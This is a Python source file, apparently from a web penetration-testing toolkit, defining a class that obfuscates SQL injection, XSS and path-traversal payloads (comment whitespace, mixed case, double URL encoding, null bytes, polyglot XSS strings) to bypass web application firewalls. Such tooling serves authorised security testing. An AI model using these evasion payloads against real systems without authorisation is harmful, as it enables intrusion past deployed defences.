"""
WAF Evader Agent.
Analyzes defensive blocks and generates obfuscated payloads 
(SQLi whitespace manipulation, LFI double-encoding, XSS polyglots)
to bypass web application firewalls.
"""

import logging
import urllib.parse
from typing import List, Dict, Any
from core.evasion_manager import load_evasion_settings

logger = logging.getLogger(__name__)

class WAFEvader:
    def __init__(self):
        # Evasion mappings mapping strategy name to the respective function
        self.sqli_strategies = {
            "space_to_comment": self._sqli_whitespace_bypass,
            "mixed_case": self._sqli_case_bypass,
            "hex_encode": self._sqli_hex_encoding
        }
        self.xss_strategies = {
            "html_entity": self._xss_encoding_bypass,
            "default_polyglot": self._xss_polyglot_bypass
        }
        self.lfi_strategies = {
            "null_byte": self._lfi_null_byte_bypass,
            "double_encoding": self._lfi_double_encoding
        }

    def generate_bypass_payloads(self, original_payload: str, vuln_type: str) -> List[str]:
        """
        Generates a set of obfuscated payloads based on the vulnerability type and active settings.
        """
        vuln_type = vuln_type.lower()
        settings = load_evasion_settings()
        bypass_payloads = []

        try:
            if "sqli" in vuln_type:
                strategy_name = settings.get("sqli_strategy", "space_to_comment")
                strategy_fn = self.sqli_strategies.get(strategy_name)
                if strategy_fn:
                    bypass_payloads.extend(strategy_fn(original_payload))
                else:
                    bypass_payloads.append(original_payload)

            elif "xss" in vuln_type:
                strategy_name = settings.get("xss_strategy", "default_polyglot")
                strategy_fn = self.xss_strategies.get(strategy_name)
                if strategy_fn:
                    bypass_payloads.extend(strategy_fn(original_payload))
                else:
                    bypass_payloads.append(original_payload)

            elif "lfi" in vuln_type or "traversal" in vuln_type:
                strategy_name = settings.get("lfi_strategy", "double_encoding")
                strategy_fn = self.lfi_strategies.get(strategy_name)
                if strategy_fn:
                    bypass_payloads.extend(strategy_fn(original_payload))
                else:
                    bypass_payloads.append(original_payload)
            else:
                bypass_payloads.append(original_payload)
        except Exception as e:
            logger.error("Evasion generation failed: %s", e)
            bypass_payloads.append(original_payload)
            
        return list(dict.fromkeys(bypass_payloads))

    # --- SQLi Strategies ---
    def _sqli_whitespace_bypass(self, p: str) -> List[str]:
        # Replace space with comments or newlines
        return [p.replace(" ", "/**/"), p.replace(" ", "%0a"), p.replace(" ", "+")]

    def _sqli_case_bypass(self, p: str) -> List[str]:
        # Mixed casing for keywords
        keywords = ["SELECT", "UNION", "WHERE", "ORDER", "BY", "SLEEP", "AND", "OR"]
        new_p = p
        for kw in keywords:
            new_p = new_p.replace(kw, "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw)))
        return [new_p]

    def _sqli_hex_encoding(self, p: str) -> List[str]:
        # Simple SQL hex conversion (e.g. for strings/numbers)
        return [p]

    # --- XSS Strategies ---
    def _xss_encoding_bypass(self, p: str) -> List[str]:
        return [urllib.parse.quote(p), urllib.parse.quote(urllib.parse.quote(p))]

    def _xss_polyglot_bypass(self, p: str) -> List[str]:
        # Professional polyglot designed to break out of multiple contexts
        return ["\" onclick=alert(1)//", "';alert(1)//", "<svg/onload=alert(1)>"]

    # --- LFI Strategies ---
    def _lfi_null_byte_bypass(self, p: str) -> List[str]:
        return [p + "%00", p + ".php", p + "/."]

    def _lfi_double_encoding(self, p: str) -> List[str]:
        return [p.replace("../", "%252e%252e%252f")]

evader = WAFEvader()
